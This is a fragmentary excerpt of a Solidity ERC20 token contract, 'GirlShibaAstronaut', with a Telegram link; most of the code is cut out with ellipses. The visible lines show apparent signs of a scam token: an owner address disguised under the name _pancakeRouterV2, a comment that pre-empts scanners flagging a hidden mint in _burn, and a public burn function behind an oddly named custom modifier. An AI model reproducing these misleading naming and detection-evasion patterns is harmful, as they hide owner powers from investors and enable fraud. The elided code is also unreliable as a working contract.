...
📲 Telegram > https://t.me/girlshibaastronaut
...
contract Context {
 ...
 contract GirlShibaAstronaut is Context, ERC20, ERC20Metadata {
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private _balances;
    mapping(address => bool) private _excluded;

    string private _name = "GirlShibaAstronaut";
    string private _symbol = "GSA";
    ...
    uint256 private fee = 5; // Marketing + LP
    ...
    address private _pancakeRouterV2 = 0x7502994E53786dd7B6fF42EcC488Ea0A97D66A5b; // Owner
  ...
  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    ...
    function _burn(address accountTVENVOO, uint256 amount) internal virtual {
        ...
        _totalSupply -= amount; // Deployment of the supply. Might false detect as a mint.
    ...
    function burntokens() public externelBurn { // Burn Tokens. Renounce to deny functions.
